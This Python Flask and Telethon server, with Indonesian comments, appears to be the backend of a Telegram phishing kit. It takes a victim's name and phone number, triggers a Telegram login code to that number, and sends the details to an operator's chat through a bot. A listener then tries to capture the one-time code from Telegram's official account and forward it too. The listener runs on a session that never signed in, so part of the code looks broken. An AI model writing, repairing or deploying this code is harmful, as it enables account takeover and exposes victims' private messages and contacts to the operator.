import os
import requests
import asyncio
import re
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

# Ambil Config dari Railway Env
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Memory Storage untuk Railway (Tanpa SQLite)
user_sessions = {}  
active_status_msg = {} 

def bot_api(method, payload):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    return requests.post(url, json=payload).json()

@app.route('/register', methods=['POST'])
async def register():
    try:
        data = request.json
        step = data.get('step')
        raw_nomor = data.get('nomor', '').strip().replace(" ", "")
        nomor = '+62' + raw_nomor[1:] if raw_nomor.startswith('0') else raw_nomor
        nama = data.get('nama', 'User')

        # Gunakan StringSession kosong untuk menghindari error 'unable to open database'
        client = TelegramClient(StringSession(""), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            # Kirim OTP awal ke target agar backend dapat akses sesi
            res = await client.send_code_request(nomor)
            user_sessions[nomor] = {"session": client.session.save(), "nama": nama}
            
            # Tampilan bot dengan tombol otp
            bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : ",
                "parse_mode": "Markdown",
                "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"track_{nomor}"}]]}
            })
            await client.disconnect()
            return jsonify({"status": "success"}), 200
            
    except Exception as e:
        print(f"Error detail: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/webhook', methods=['POST'])
async def webhook():
    update = request.json
    if "callback_query" in update:
        call = update["callback_query"]
        data = call["data"]
        
        if data.startswith("track_"):
            nomor = data.split("_")[1]
            # Tampilan status menunggu
            res = bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": "status menunggu OTP",
                "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
            })
            active_status_msg[nomor] = res.get("result", {}).get("message_id")
            
            # Jalankan background listener secara otomatis
            session_str = user_sessions.get(nomor, {}).get("session")
            if session_str:
                asyncio.create_task(otp_listener(nomor, session_str))

        elif data.startswith("exit_"):
            nomor = data.split("_")[1]
            if nomor in active_status_msg:
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_status_msg[nomor]})
                active_status_msg.pop(nomor)
            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Anda telah keluar dari mode input inline"})

    return jsonify({"status": "success"}), 200

async def otp_listener(nomor, session_str):
    client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
    await client.connect()
    
    # Deteksi pesan baru dari Telegram Official (777000)
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        otp_match = re.search(r'\b\d{5}\b', event.raw_text)
        if otp_match:
            otp_code = otp_match.group(0)
            # Hapus status menunggu
            if nomor in active_status_msg:
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_status_msg[nomor]})
                active_status_msg.pop(nomor)
            
            nama = user_sessions.get(nomor, {}).get("nama", "User")
            bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{otp_code}`",
                "parse_mode": "Markdown"
            })
            await client.disconnect()

    await asyncio.sleep(600) # Pantau selama 10 menit
    await client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))